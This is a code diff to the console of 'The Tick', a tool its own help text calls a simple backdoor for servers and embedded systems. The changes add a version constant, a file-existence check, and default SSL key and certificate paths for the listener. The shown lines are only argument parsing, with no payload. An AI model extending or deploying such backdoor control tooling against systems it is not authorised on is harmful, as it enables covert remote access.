@@ -14,6 +14,8 @@ See the LICENSE file for further details.
 """
 from __future__ import print_function
 
+TICK_VERSION = "0.2"
+
 ##############################################################################
 # Imports and other module initialization.
 
@@ -1240,12 +1242,18 @@ class Console(Cmd):
         # is blocked waiting for user input, and queue them in any other case.
         self.inside_prompt = False
 
+        # File existence validator.
+        def validate_filename(parser, name, arg):
+            if not os.path.exists(arg):
+                parser.error(name + " not found: " + arg)
+            return arg
+
         # All the supported command line switches go here.
         parser = ArgumentParser(formatter_class=ColorHelpFormatter,
                 prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
                 description="A simple backdoor for servers and embedded systems.")
         parser.add_argument("--version", action="version",
-                version="The Tick, by Mario Vilas, version " + Fore.YELLOW + "0.1" + Style.RESET_ALL)
+                version="The Tick, by Mario Vilas, version "+Fore.YELLOW+TICK_VERSION+Style.RESET_ALL)
         parser.add_argument("-b", "--bind", dest="bind_addr", default="0.0.0.0",
                 metavar=Fore.BLUE+Style.BRIGHT+"ADDRESS"+Style.RESET_ALL,
                 help="IP address to bind all the listeners to [default: "+Fore.YELLOW+"0.0.0.0"+Style.RESET_ALL+"]")
@@ -1255,12 +1263,12 @@ class Console(Cmd):
         parser.add_argument("-s", "--ssl", type=int, default=6666, dest="ssl_port",
                 metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
                 help="Port to bind the SSL listener to [default: "+Fore.YELLOW+"6666"+Style.RESET_ALL+"]")
-        parser.add_argument("-k", "--keyfile",
+        parser.add_argument("-k", "--keyfile", type=lambda x: validate_filename(parser, "keyfile", x), default="keyfile.pem",
                 metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
-                help="SSL keyfile (required to enable SSL)")
-        parser.add_argument("-c", "--certfile",
+                help="SSL keyfile [default: "+Fore.YELLOW+"keyfile.pem"+Style.RESET_ALL+"]")
+        parser.add_argument("-c", "--certfile", type=lambda x: validate_filename(parser, "certfile", x), default="certfile.pem",
                 metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
-                help="SSL certfile (required to enable SSL)")
+                help="SSL certfile [default: "+Fore.YELLOW+"certfile.pem"+Style.RESET_ALL+"]")
         parser.add_argument("--no-color", action="store_true", default=False,
                 help=("Disable the use of ANSI escape sequences (i.e. pretty "+
                 Fore.RED+"c"+Style.BRIGHT+"o"+Fore.YELLOW+"l"+Fore.GREEN+"o"+Fore.BLUE+"r"+Fore.MAGENTA+"s"+Style.RESET_ALL+
